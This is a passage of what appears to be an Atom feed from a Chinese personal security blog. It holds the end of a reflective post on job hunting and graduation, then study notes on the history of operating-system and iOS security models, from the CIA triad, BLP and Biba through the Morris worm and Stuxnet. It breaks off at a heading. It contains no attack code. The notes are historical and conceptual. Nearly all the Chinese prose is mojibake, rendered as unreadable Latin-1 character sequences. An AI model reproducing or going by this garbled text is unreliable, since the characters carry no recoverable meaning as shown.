”ä¸‰çš„å¼€å§‹å³ç»™2021ç§‹æ‹›æ‹‰å¼€åºå¹•ï¼Œæˆ‘çš„macæ—¥å†ä¸­è®°å½•ç€é‚£æ—¶ç–¯ç‹‚çš„é¢è¯•æ—¶é—´è¡¨ï¼Œä¸€å‘¨é¢ä¸ª4-5æ¬¡éƒ½æ˜¯æ­£å¸¸çš„æƒ…å†µï¼Œæœ‰æ—¶å€™ä¸€å¤©æœ€å¤š3åœºé¢è¯•ã€‚åˆšå¼€å§‹é¢è¯•çš„æ—¶å€™è¿˜éå¸¸çš„ä¸è‡ªä¿¡ï¼Œæ„Ÿè§‰è‡ªå·±æ²¡äººè¦ï¼Œä½†åœ¨ç»è¿‡ä¸€äº›å°å‚é¢è¯•ä¹‹åå‘ç°è‡ªå·±ä¼¼ä¹è¿˜å¯ä»¥ï¼Œæœ€æç¬‘çš„æ˜¯æŸä¸ªå°å‚çš„é¢è¯•å®˜åè¿‡æ¥å‘æˆ‘è¯·æ•™é—®é¢˜ğŸ¤£ã€‚è¦è¯´é—æ†¾ä¹Ÿæ˜¯æœ‰çš„ï¼Œæˆ‘åœ¨é¢è¯•å®Œæ·±ä¿¡æœä¹‹åï¼Œæ²¡æƒ³åˆ°è¿˜æœ‰ä¸ªåŠ é¢ç¯èŠ‚ï¼Œè¿‡äº†åŠ é¢ç¯èŠ‚ä¹‹åï¼Œçº¦äº†hré¢ç»“æœå¿˜è®°äº†ï¼Œå¯¼è‡´è¿™ä¸ªofferæœ€åæ²¡æœ‰æ‹¿åˆ°ï¼Œæœ¬æ¥è¿˜æƒ³çœ‹çœ‹æœ‰åŠ é¢çš„offerå¼€å¤šå°‘ä»·ä½å‘¢ï¼ˆå‡¡å°”èµ›ï¼‰ã€‚é¢è¯•è¿‡ç¨‹ä¸­ä¹Ÿæœ‰ç³Ÿå¿ƒçš„äº‹æƒ…å‘ç”Ÿï¼Œé‚£å°±æ˜¯å­™è€æ¿ï¼Œå­™è€æ¿è‡ªä»å‘ç°æˆ‘åœ¨å·¥ä½œæ—¶é—´æ®µå·å·é¢è¯•ä¹‹åï¼Œå°±å¼€å§‹å®šæ—¶æŠ½æŸ¥æˆ‘çš„åœ¨ä½æƒ…å†µï¼Œä¸€æ—¦å‘ç°æˆ‘ä¸åœ¨å·¥ä½å¹¶ä¸”ç”µè„‘ä¹Ÿæ¶ˆå¤±ä¸è§ï¼Œå°±å¼€å§‹å¾®ä¿¡ç”µè¯è­¦å‘Šâš ï¸ï¼Œæˆ‘æœ‰ä¸¤ä¸‰æ¬¡é¢è¯•å°±å› ä¸ºè¿™æ ·ï¼Œå¼„å¾—é¢è¯•å®˜å’Œæˆ‘éƒ½ååˆ†çš„å°´å°¬ã€‚</p><p>å½“æ—¶é—´æ¥åˆ°äº†2022çš„ç§‹æ‹›ï¼Œæˆ‘æ‰çŒ›çš„å‘ç°ï¼Œä¹‹å‰æˆ‘å«Œå¼ƒçš„ä¸€äº›offeråœ¨ä»Šå¹´æ˜¾å¾—å°¤ä¸ºå®è´µï¼Œè¯¸å¤šå¤§å‚å‡ ä¹ä¸æ‹›æˆ–è€…å°‘é‡æ‹›ï¼Œå»å¹´è¿˜æœ‰å£å·ï¼šæœ‰é¹…é€‰é¹…ï¼Œæ— é¹…å»¶æ¯•ã€‚è¦æ˜¯çœŸå»¶æ¯•ï¼Œä»Šå¹´æ€•æ˜¯ç›´æ¥å‘½ä¸§é»„æ³‰ï¼Œæ¢åšæ˜¯æˆ‘å¿ƒæ€ç›´æ¥å´©äº†ã€‚æˆ‘æ˜¯å¹¸è¿çš„ï¼Œèº²è¿‡äº†ä»Šå¹´çš„å¯’æ½®ï¼Œä¸çŸ¥é“å»å¹´æ˜¯å¦æ˜¯äº’è”ç½‘æœ€åçš„è¾‰ç…Œï¼Ÿæˆ‘ä¹Ÿæ„è¯†åˆ°è¿é”ååº”çš„å¯æ€•ï¼Œå¦‚æœæˆ‘æœ¬ç§‘è€ƒç ”ç¬¬ä¸€æ¬¡æ²¡æœ‰æˆåŠŸï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¿æ¥æˆ‘çš„å°±æ˜¯äºŒæˆ˜ï¼Œå¦‚æœäºŒæˆ˜æˆåŠŸä¸Šå²¸ï¼Œé‚£ä¹ˆä»Šå¹´çš„å¯’æ½®ä¹Ÿä¼šè®©æˆ‘å°¸éª¨æ— å­˜ã€‚</p><p>åº¦è¿‡äº†è‰°éš¾ï¼ˆç›¸æ¯”2022ä¸ç®—éš¾ï¼‰çš„ç§‹æ‹›ä¹‹åï¼Œæ—¶é—´æ¥åˆ°äº†12æœˆï¼Œæˆ‘çš„æ¯•ä¸šè®¾è®¡å‡ ä¹æ²¡æ€ä¹ˆåŠ¨ã€‚ã€‚ã€‚éƒ½æŠŠæ—¶é—´æŠ•å…¥åˆ°æ‰¾å·¥ä½œå½“ä¸­äº†ï¼Œå½“æ—¶çš„æˆ‘ä¸ºäº†æ‹¼å‘½è‚æ¯•è®¾ï¼Œå¼€å§‹å­¦ä¹ å¸ˆå…„ä»¬ç¡å®éªŒå®¤çš„ç²¾ç¥ï¼Œåœ¨å®éªŒå®¤é‡Œå·®ä¸å¤šç¡äº†å¿«3ä¸ªæœˆï¼Œå°±è¿™æ ·ä¸€ç›´åˆ°3æœˆåº•æ‰æŠŠæ‚¬ç€çš„å¿ƒæ”¾ä¸‹æ¥ã€‚ä¸­é—´çš„å¿ƒé…¸å®åœ¨è¯´ä¸å®Œï¼Œæˆ‘ç¬¬ä¸€æ¬¡ä¸­æœŸç­”è¾©æ²¡è¿‡ï¼Œæå¾—æˆ‘å‹åŠ›å¾ˆå¤§ï¼Œåªèƒ½æŠ“ç´§æ—¶é—´ç»§ç»­ä¸°å¯Œæ¯•ä¸šè®¾è®¡çš„å†…å®¹ã€‚æ¯•è®¾å®ç°è¿‡ç¨‹ä¸­å‹åŠ›å¤§çš„æƒ³å“­ï¼Œåªèƒ½è‡ªå·±ç‹¬è‡ªæŠ—ä¸‹ï¼Œå½“æœ€åç»ˆäºå®Œæˆçš„æ—¶å€™ï¼Œæ‰å‘ç°è‡ªå·±å·²ç»èµ°äº†å¾ˆé•¿ä¸€æ®µè·¯ã€‚æœ€åè¯´ä¸€å¥å…¬é“çš„è¯ï¼Œæˆ‘å¯¼å¸ˆä¸è®©æˆ‘ç¬¬ä¸€æ¬¡ä¸­æœŸç­”è¾©é€šè¿‡ï¼Œç¡®å®æ˜¯ä¿æŠ¤äº†æˆ‘ï¼Œè®©æˆ‘æœ€ç»ˆé¡ºåˆ©é€šè¿‡ç­”è¾©ï¼ˆç”šè‡³è¿˜è¢«è¯„å§”è€å¸ˆç‚¹åè¡¨æ‰¬ï¼Œéœ‡æƒŠï¼ï¼‰ã€‚</p><p>5æœˆ8å·ç­”è¾©å®Œæ¯•ï¼Œå†ç¨ä½œä¿®æ”¹ï¼Œäº¤å®Œæ¯•ä¸šææ–™ï¼Œå¼€å§‹äº†æˆ‘çš„æ‘¸é±¼ç”Ÿæ´»ã€‚æˆ‘å½“æ—¶ä¸ºäº†å¥–åŠ±è‡ªå·±ï¼Œç»™è‡ªå·±è§„åˆ’äº†ä¸€å¥—1wçš„DIYç”µè„‘ï¼Œä»é€‰è´­åˆ°æœ€åç»„è£…ï¼Œæˆ‘çš„ç”µè„‘æŠ€èƒ½å¾—åˆ°å¢å¼ºï¼Œç¬¬ä¸€æ¬¡ç»„è£…äº†ä¸€å°å°æœºç®±ç”µè„‘ï¼Œå†…éƒ¨ç©ºé—´å‡ ä¹å…¨éƒ¨å æ»¡ï¼Œä½“ä¼šåˆ°äº†æ”’æœºçš„å¿«ä¹ã€‚ç„¶è€Œæ¯•ä¸šçš„ä¼‘é—²æ—¶å…‰å› ä¸ºç–«æƒ…å……æ»¡ç€æ— å¥ˆï¼Œå½“æ—¶5æœˆ8å·ç­”è¾©å®Œä¹‹åï¼ŒåŒ—äº¬çš„ç–«æƒ…éšå³çˆ†å‘ï¼Œç›´æ¥åœ¨å®¿èˆå¾…äº†å¿«ä¸€ä¸ªå¤šæœˆï¼Œæœ¬æ¥æƒ³å»é€›é€›åŒ—äº¬çš„åšç‰©é¦†å’Œå†å²æ–‡ç‰©ï¼Œç»“æœåˆ°å¿«èµ°ä¹‹å‰ä¹Ÿåªå’Œ17ä¸€èµ·çœ‹äº†ä¸€å®¶ï¼Œç®€ç›´éš¾é¡¶ã€‚æ›´å€’éœ‰çš„æ˜¯ï¼Œæˆ‘ä»åŒ—äº¬å›åˆ°æˆéƒ½ä¹‹åï¼Œæˆéƒ½ä¹Ÿå¼€å§‹ç–«æƒ…äº†ã€‚ã€‚ã€‚æˆ‘åˆè¢«å°äº†å¿«ä¸€ä¸ªæœˆã€‚ã€‚ã€‚</p><h2 id="ä¸€äº›åæ€"><a href="#ä¸€äº›åæ€" class="headerlink" title="ä¸€äº›åæ€"></a>ä¸€äº›åæ€</h2><p>è‡ªå·±åŠªåŠ›ç¨‹åº¦ä¸å¤Ÿå¯¼è‡´çš„ä¸€äº›é—®é¢˜ï¼Œåšåˆ°80åˆ†çš„æ—¶å€™å°±è§‰å¾—å·²ç»è¶³å¤Ÿäº†ï¼Œæ€»æƒ³ç€å‡‘åˆç€å¯ä»¥ï¼Œä½†è¿™ç§æ€åº¦è®©æˆ‘å¤±å»äº†ä¸€äº›æœºä¼šï¼ˆå“ä¸­å“ç­ç”³è¯·ã€ä¿ç ”ã€CTFæ™‹çº§ç­‰ï¼‰ã€‚ä¸èƒ½åœ¨å–å¾—ä¸€å®šæˆç»©ä¹‹åï¼Œå°±å¼€å§‹æ¾æ‡ˆï¼Œä¸è¦å¿˜è®°ä¸€å¼€å§‹çš„ç›®æ ‡ã€‚</p><p>ä¸€äº›åŸºç¡€çš„å…³é”®èƒ½åŠ›ï¼Œæ¯”å¦‚è‹±è¯­ã€æ²Ÿé€šè¡¨è¾¾ã€é˜…è¯»èƒ½åŠ›è™½ç„¶åœ¨è¿™å‡ å¹´ä¸­æœ‰ç€ä¸€å®šç¨‹åº¦çš„è¿›æ­¥ï¼Œä½†ä»ç„¶éœ€è¦æŒç»­å­¦ä¹ æå‡ã€‚åŸºç¡€èƒ½åŠ›å†³å®šä¸€ä¸ªäººåˆ°åº•èƒ½èµ°å¤šè¿œã€‚è¿™ç‚¹å¯¹äºæˆ‘çš„ä¸“ä¸šèƒ½åŠ›è€Œè¨€ä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘çš„å†™ä»£ç èƒ½åŠ›è¾ƒä¸ºä¸€èˆ¬ï¼Œè¿™ç‚¹è™½ç„¶åœ¨å®‰å…¨æµ‹è¯•ä¸Šä¸ä¼šæœ‰æ˜¾è‘—å½±å“ï¼Œä½†æ˜¯å¯¹ä»¥åå»ç†è§£ä»–äººçš„ç¨‹åºé€»è¾‘ã€ä»£ç å®¡è®¡ã€é€†å‘åˆ†æéƒ½æœ‰å¥½å¤„ã€‚æ‰€ä»¥ä¹‹åçš„å‡ å¹´ä¸€å®šè¦æŠ½ç©ºè¡¥è¡¥ä»£ç åŸºç¡€ã€‚</p><p>æ—¶é—´ç®¡ç†èƒ½åŠ›å’Œç²¾åŠ›ç®¡ç†èƒ½åŠ›ï¼Œæ˜¯ä¸¤ä¸ªåœ¨å·¥ä½œä¸­ååˆ†é‡è¦çš„èƒ½åŠ›ï¼Œè¦è§„åˆ’å¥½è‡ªå·±ç°åœ¨æ‰‹ä¸Šäº‹æƒ…çš„ä¼˜å…ˆçº§ï¼Œå¹¶ä¸”æŒæ¡è‡ªå·±ä¸€å¤©ç²¾åŠ›çš„æƒ…å†µï¼Œåœ¨ç²¾åŠ›æœ€å¥½çš„æ—¶å€™å»å¤„ç†æœ€éš¾çš„äº‹æƒ…ã€‚</p><p>å¯¹è‡ªå·±æ›´åŠ è‡ªä¿¡ä¸€ç‚¹ï¼Œå¯ä»¥è‡ªé»‘è¯´è‡ªå·±åœ¨ä¸‹æ°´é“è¡Œä¸šå·¥ä½œï¼Œå¯ä»¥è¯´è‡ªå·±èœï¼Œä½†è¦å°‘è¯´è‡ªå·±ä¸è¡Œã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è·ç¦»ç ”ç©¶ç”Ÿæ¯•ä¸šå·²ç»è¿‡äº†4ä¸ªå¤šæœˆï¼Œåœ¨è¿™ä¸ªå›½åº†èŠ‚æœŸé—´é‡è§äº†å¾ˆå¤šè€åŒå­¦ï¼ŒåŒ…æ‹¬é«˜ä¸­å’Œå¤§å­¦åŒå­¦ï¼Œæ„Ÿè§‰åˆ°è¿‡äº†è¿™ä¹ˆå‡ å¹´æ¯ä¸ªäººçš„äººç”Ÿè½¨è¿¹éƒ½å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ï¼Œæˆ‘æƒ³ä¹Ÿæ˜¯æ—¶å€™å¯¹è‡ªå·±ç¬¬ä¸€ä¸ªâ€œäººç”Ÿä¸ƒå¹´â€åšä¸ªæ€»ç»“ï¼Œæƒ³æŠŠè¿™äº›çè´µçš„å†…å®¹è®°å½•ä¸‹æ¥ï¼Œæˆ–è®¸å¤šå¹´ä¹‹åå†æ¬¡å›çœ‹ä¼šåˆ«æœ‰ä¸€ç•ªæ»‹å‘³åœ¨å¿ƒå¤´ã€‚è‡³äºä¸ºä»€ä¹ˆæˆ‘è¯´
      
    
    </summary>
    
      <category term="æ‚è°ˆ" scheme="https://hurricane618.me/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="äººç”Ÿ" scheme="https://hurricane618.me/tags/%E4%BA%BA%E7%94%9F/"/>
    
  </entry>
  
  <entry>
    <title>iOSç³»ç»Ÿå®‰å…¨æ¡†æ¶æ¼”è¿›å­¦ä¹ </title>
    <link href="https://hurricane618.me/2022/11/18/ios-system-security-framework-study-1/"/>
    <id>https://hurricane618.me/2022/11/18/ios-system-security-framework-study-1/</id>
    <published>2022-11-17T16:42:44.000Z</published>
    <updated>2022-11-17T16:55:29.875Z</updated>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ å®Œç‹é“ç£Šå¤§ä½¬åœ¨åä¸ºçš„åˆ†äº«è§†é¢‘ï¼Œè®°å½•æ€»ç»“ä¸€äº›æœ‰ç”¨çš„å†…å®¹ã€‚è¿˜ä¼šæ ¹æ®åˆ†äº«çš„å†…å®¹å†é¢å¤–è¡¥å……ä¸€äº›å…¶ä»–ç›¸å…³å†…å®¹ã€‚</p><h2 id="æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•"><a href="#æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•" class="headerlink" title="æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•"></a>æ“ä½œç³»ç»Ÿçš„æ¼”åŒ–ä¸å®‰å…¨å‘å±•</h2><p>ä»è®¡ç®—æœºæ•´ä½“çš„å‘å±•æ¼”åŒ–æ–¹å‘æ¥çœ‹ï¼Œå¯ä»¥å°†å…¶å®‰å…¨åˆ†ä¸ºå››ä¸ªé˜¶æ®µï¼š</p><ul><li>1970~1980ï¼šåŸºç¡€ç†è®ºæ¨¡å‹é˜¶æ®µ</li><li>1980~2000ï¼šæœåŠ¡å™¨å®‰å…¨é˜¶æ®µ</li><li>2000~2010ï¼šä¸ªäººç”µè„‘å®‰å…¨é˜¶æ®µ</li><li>2010~2020ï¼šç§»åŠ¨è®¾å¤‡å®‰å…¨é˜¶æ®µ</li></ul><p>è®¡ç®—æœºç³»ç»Ÿä¸šåŠ¡çš„å˜è¿å¼•èµ·å¨èƒæ¨¡å‹çš„å˜è¿ï¼Œè¿›è€Œå¼•èµ·ç³»ç»Ÿå®‰å…¨ç ”ç©¶é‡ç‚¹çš„å˜è¿ã€‚</p><h3 id="1970-1980-ç³»ç»Ÿå®‰å…¨ç†è®ºæ¨¡å‹å¤§å‘å±•"><a href="#1970-1980-ç³»ç»Ÿå®‰å…¨ç†è®ºæ¨¡å‹å¤§å‘å±•" class="headerlink" title="1970~1980 ç³»ç»Ÿå®‰å…¨ç†è®ºæ¨¡å‹å¤§å‘å±•"></a>1970~1980 ç³»ç»Ÿå®‰å…¨ç†è®ºæ¨¡å‹å¤§å‘å±•</h3><p>ä»ä¸€å¼€å§‹çš„å•ç‰‡æœºé‡Œçš„å•ç”¨æˆ·ã€èµ„æºç‹¬å ï¼Œå‘å±•åˆ°å·¨å‹æœºçš„åˆ†æ—¶ã€èµ„æºå…±äº«ã€å¤šç”¨æˆ·æ¨¡å¼ã€‚</p><p>é—®é¢˜ï¼šå¦‚ä½•ç®¡ç†ç”¨æˆ·æƒé™ã€é˜²æ­¢è¶Šæƒè®¿é—®ã€ç¯¡æ”¹æœºå¯†ä¿¡æ¯ï¼Ÿ</p><p>ç»è¿‡å­¦æœ¯ç•Œè®¨è®ºä¹‹åå½¢æˆäº†åŸºæœ¬å…±è¯† å®‰å…¨ä¸‰è¦ç´ CIAï¼š</p><ul><li>æœºå¯†æ€§</li><li>å®Œæ•´æ€§</li><li>å¯ç”¨æ€§</li></ul><p>åœ¨æ­¤ä¹‹åï¼ŒJames P.Andersonåœ¨<code>Computer Security Technology Planning Study</code>ä¸­æå‡ºäº†Reference Monitorçš„æ¦‚å¿µï¼Œç”¨æˆ·çš„è®¿é—®éœ€è¦é€šè¿‡Reference Monitorè£å†³åˆ¤æ–­ï¼Œè¿™ç§æ§åˆ¶æ¨¡å‹é€æ¸æ¼”å˜æˆäº†åæ¥çš„å¯ä¿¡ç†è®ºåŸºç¡€ã€‚ï¼ˆç±»ä¼¼äºæ³•å®˜çš„å­˜åœ¨ï¼‰</p><p>æ•°æ®è®¿é—®æ§åˆ¶åŸºæœ¬æ¨¡å‹ï¼š</p><p>D.Bellå’ŒL.LaPadulaæå‡ºBLPæ¨¡å‹ï¼ˆæ•°æ®æœºå¯†æ€§åŸºæœ¬åŸåˆ™ï¼‰</p><ul><li>åœ¨BLPæ¨¡å‹ä¸‹ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿçš„åˆè¯•çŠ¶æ€æ˜¯å®‰å…¨çš„ï¼Œé‚£ä¹ˆç»è¿‡ä¸€ç³»åˆ—ç¬¦åˆè§„åˆ™çš„çŠ¶æ€è½¬æ¢åï¼Œè¯¥ç³»ç»Ÿè¿˜æ˜¯å®‰å…¨çš„</li><li>å½¢å¼åŒ–è¯æ˜äº†è®¡ç®—æœºç³»ç»Ÿå¯ä»¥é€šè¿‡å¯¹å±‚çº§æœºå¯†ä¿¡æ¯è®¿é—®æ§åˆ¶çº¦æŸï¼Œç¡®ä¿è®¡ç®—æœºç³»ç»Ÿä¸­æ•°æ®çš„æœºå¯†æ€§ï¼ˆäººè¯ï¼šå¦‚æœçº¦æŸæ¡ä»¶è¶³å¤Ÿå®‰å…¨ï¼Œåˆ™è®¿é—®å³ä¸ºå®‰å…¨ï¼‰</li></ul><p>Bibaæ¨¡å‹ï¼ˆæ•°æ®å®Œæ•´æ€§åŸºæœ¬åŸåˆ™ï¼‰</p><p>BLPå’ŒBibaæ¨¡å‹å¥ å®šäº†Reference Monitor Policyçš„ç†è®ºåŸºç¡€ã€‚ï¼ˆç±»ä¼¼äºæ³•å¾‹æ¡æ–‡ï¼‰</p><p>æ“ä½œç³»ç»Ÿå®‰å…¨è®¾è®¡åŸºæœ¬åŸåˆ™ï¼ˆThe Protection of Information in Computer System, 1975ï¼‰</p><ul><li><strong>Open design å¼€æ”¾è®¾è®¡</strong></li><li><strong>Separation of privilege æƒé™åˆ†ç¦»</strong></li><li><strong>Least privilege æœ€å°æƒé™</strong></li><li>Economy of mechanism ç»æµåŸåˆ™</li><li>Fail-safe defaults é»˜è®¤å¤±è´¥</li><li>Complete mediation å®Œå…¨é‰´æƒ</li><li>Least common mechanism æœ€å°å…¬å…±æœºåˆ¶</li><li>Psychological acceptability ç•Œé¢ç®€å•æ˜“ç”¨</li></ul><h3 id="1980-2000-æ“ä½œç³»ç»Ÿ-æœåŠ¡å™¨å¿«é€Ÿå‘å±•"><a href="#1980-2000-æ“ä½œç³»ç»Ÿ-æœåŠ¡å™¨å¿«é€Ÿå‘å±•" class="headerlink" title="1980~2000 æ“ä½œç³»ç»Ÿ/æœåŠ¡å™¨å¿«é€Ÿå‘å±•"></a>1980~2000 æ“ä½œç³»ç»Ÿ/æœåŠ¡å™¨å¿«é€Ÿå‘å±•</h3><p>æœåŠ¡å™¨å¸‚åœºå…´èµ·ï¼Œé€šç”¨æ“ä½œç³»ç»Ÿå¿«é€Ÿå‘å±•ï¼Œç³»ç»Ÿå®‰å…¨åœ¨ä¸æ–­æ¢ç´¢ä¸­å½¢æˆäº†åŸºæœ¬æ¡†æ¶ï¼š</p><ul><li>å†…æ ¸ä¸ç”¨æˆ·æ€éš”ç¦»</li><li>ç”¨æˆ·æ€è¿›ç¨‹å†…å­˜éš”ç¦»</li><li>å®ç°äº†ä»¥ç”¨æˆ·ç”¨æˆ·/ç¾¤ç»„ä¸ºä¸»ä½“ï¼Œæ–‡ä»¶ç­‰èµ„æºä¸ºå®¢ä½“ï¼Œè¯»å†™æ‰§è¡Œç­‰ä¸ºç²’åº¦çš„è®¿é—®æ§åˆ¶ä½“ç³»</li></ul><p>ä¸¤ç±»è®¿é—®æ§åˆ¶</p><ul><li>DACè‡ªä¸»è®¿é—®æ§åˆ¶<ul><li>å®¢ä½“çš„æ‹¥æœ‰è€…ï¼ˆOwnerï¼‰å¯ä»¥è‡ªå®šä¹‰å®¢ä½“è®¿é—®ç­–ç•¥</li></ul></li><li>MACå¼ºåˆ¶è®¿é—®æ§åˆ¶<ul><li>å…¨å±€é¢„å®šä¹‰è®¿é—®ç­–ç•¥ï¼Œæ‹¥æœ‰è€…ï¼ˆOwnerï¼‰ä¹Ÿæ— æƒä¿®æ”¹</li></ul></li></ul><p>æ•´ä½“å±‚çº§åˆ†æˆ User -&gt; Kernel -&gt; Hardware ä¸‰å±‚ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  User Space</span><br><span class="line"></span><br><span class="line">            +-----------------+            +------------------+</span><br><span class="line">            |                 |            |                  |</span><br><span class="line">            |    Process1     |            |    Process2      |</span><br><span class="line">            |                 |            |                  |</span><br><span class="line">            +--------+--------+            +---------+--------+</span><br><span class="line">                     |                               |</span><br><span class="line">                     |                               |</span><br><span class="line">                     |                               |</span><br><span class="line">+--------------------------------------------------------------------------+</span><br><span class="line">                     |                               |</span><br><span class="line">                     |                               |</span><br><span class="line"> Kernel Space        |                               |</span><br><span class="line">                     |                               |</span><br><span class="line">                     v                               v</span><br><span class="line">      +--------------+-------------------------------+-------------+</span><br><span class="line">      |                                                            |</span><br><span class="line">      |                                                            |</span><br><span class="line">      |                                   +--------------------+   |</span><br><span class="line">      |                                   |                    |   |</span><br><span class="line">      |      Kernel                       |                    |   |</span><br><span class="line">      |                                   |       Drivers      |   |</span><br><span class="line">      |                                   |                    |   |</span><br><span class="line">      |                                   +--------------------+   |</span><br><span class="line">      |                                                            |</span><br><span class="line">      +------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"> Hardware</span><br><span class="line">            +-------------+    +----------------+   +------------------+</span><br><span class="line">            |             |    |                |   |                  |</span><br><span class="line">            |   CPUs      |    |     Memory     |   |     Devices      |</span><br><span class="line">            |             |    |                |   |                  |</span><br><span class="line">            +-------------+    +----------------+   +------------------+</span><br></pre></td></tr></table></figure><p>äº§ç”Ÿå®‰å…¨å¨èƒçš„æ ¸å¿ƒåŸå› ï¼š<strong>å…±äº«ï¼</strong></p><p>åŸºæœ¬å¯¹ç­–ï¼šéš”ç¦»å’Œæ§åˆ¶</p><ul><li>ä¿®å¢™â€”â€”éš”ç¦»</li><li>é—¨ç¦â€”â€”æ§åˆ¶</li></ul><p>å®‰å…¨çš„å‰¯ä½œç”¨ï¼š</p><ul><li>æ•ˆç‡é™ä½</li><li>æ˜“ç”¨æ€§ä¸‹é™</li></ul><p><strong>ç³»ç»Ÿå®‰å…¨é€æ¸æˆä¸ºä¸šåŠ¡å‘å±•çš„ç»Šè„šçŸ³</strong></p><p>è¡¥å……ï¼šä»è¿™ä¸€é˜¶æ®µèµ·ï¼Œæ¼æ´åˆ©ç”¨å¼€å§‹ç™»ä¸Šèˆå°</p><p>ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªè •è™« 1988å¹´ Morrisè •è™« åˆ©ç”¨æ ˆæº¢å‡ºä¼ æ’­è‡ªå·±</p><p>phrackæ‚å¿—ï¼ˆä»1985å¹´å­˜æ´»è‡³ä»Šï¼‰1996å¹´å‘å¸ƒç¬¬ä¸€ç¯‡å®Œæ•´çš„æ ˆæº¢å‡ºæ”»å‡»æŒ‡å— <a href="http://phrack.org/issues/49/14.html" target="_blank" rel="noopener">http://phrack.org/issues/49/14.html</a></p><h3 id="2000-2010-ä¸ªäººç”µè„‘-äº’è”ç½‘å¤§å‘å±•"><a href="#2000-2010-ä¸ªäººç”µè„‘-äº’è”ç½‘å¤§å‘å±•" class="headerlink" title="2000~2010 ä¸ªäººç”µè„‘/äº’è”ç½‘å¤§å‘å±•"></a>2000~2010 ä¸ªäººç”µè„‘/äº’è”ç½‘å¤§å‘å±•</h3><p>ä»¥Windows/Linuxä¸ºä»£è¡¨çš„æ“ä½œç³»ç»Ÿå¿«é€Ÿæ™®åŠ</p><ul><li>åŸºæœ¬ä»¥è‡ªä¸»è®¿é—®æ§åˆ¶ä¸ºä¸»</li><li>2003å¹´ç”±NSAä¸»å¯¼çš„SELinuxæ‰è¢«çº³å…¥Linux</li></ul><p>ä¸ªäººè®¡ç®—æœºç³»ç»Ÿè¿æ¥äº†å®‰å…¨é—®é¢˜çš„é›†ä¸­çˆ†å‘</p><ul><li>æ··ä¹±çš„ç¨‹åºåˆ†å‘æ¸ é“ï¼ˆxxxè½¯ä»¶å®¶å›­ï¼‰ã€æ¯«æ— å®‰å…¨çº¦æŸçš„æ‰§è¡Œç¯å¢ƒï¼ˆroot+æ— æ²™ç®±+æ— æ€æ¯’çš„è£¸å¥”ï¼‰</li><li>æ¶æ„ä»£ç ä¸‰é©¾é©¬è½¦â€”â€”ç—…æ¯’ã€æœ¨é©¬ã€è •è™«</li></ul><p>å¯ä¿¡è®¡ç®—ç»„ç»‡ï¼ˆTCGï¼‰ç”±AMDã€æƒ æ™®ã€IBMã€intelå’Œå¾®è½¯ç­‰ç¡¬ä»¶ã€è½¯ä»¶ã€æœåŠ¡ä¾›åº”å•†ç»„æˆã€‚ä»–ä»¬æå‡ºäº†TPMï¼Œæƒ³æ‰“é€ äº§ä¸šé“¾ä¸Šçš„è½¯ä»¶ç¡¬ä»¶çš„å¯ä¿¡ç¯å¢ƒï¼Œæ€è·¯æ˜¯åœ¨ç¡¬ä»¶å±‚é¢æä¾›å¯ä¿¡æ ¹ï¼Œç”¨é€”ï¼šå¯ä¿¡å¯åŠ¨ã€å®Œæ•´æ€§åº¦é‡ã€ç£ç›˜åŠ å¯†ã€å¯†é’¥ç®¡ç†ï¼Œä½†ç”±äºå•†ä¸šä¸Šçš„ç§ç§åˆ©ç›Šç‰µæ‰¯ï¼Œæœ€åè‰è‰æ”¶åœºã€‚</p><p>è¡¥å……ï¼šé‚£äº›å¹´çš„ä¼ å¥‡äº‹ä»¶</p><p>2004å¹´ 18å²å¾·å›½å°‘å¹´ç¼–å†™éœ‡è¡ç ´è •è™«</p><p>2006å¹´ 25å²æä¿Šç¼–å†™çš„ç†ŠçŒ«çƒ§é¦™ç—…æ¯’ï¼ˆä»–ä¹Ÿæ˜¯æ­¦æ±‰ç”·ç”Ÿç—…æ¯’å’ŒQQå°¾å·´ç—…æ¯’çš„ä½œè€…ï¼‰</p><p>2010å¹´ é¦–ä¸ªç½‘ç»œæ­¦å™¨çº§åˆ«çš„ç—…æ¯’è¢«å‘ç° éœ‡ç½‘ç—…æ¯’ ç›®æ ‡ä¼Šæœ—æ ¸ç”µç«™ é‡Œé¢åŒ…å«4ä¸ª0day</p><h3 id="2010-2020-ç§»åŠ¨äº’è”ç½‘-æ™ºèƒ½æ‰‹æœºå¤§çˆ†å‘"><a href="#2010-2020-ç§»åŠ¨äº’è”ç½‘-æ™ºèƒ½æ‰‹æœºå¤§çˆ†å‘" class="headerlink" title="2010~2020 ç§»åŠ¨äº’è”ç½‘/æ™ºèƒ½æ‰‹æœºå¤§çˆ†å‘"></a>2010~2020 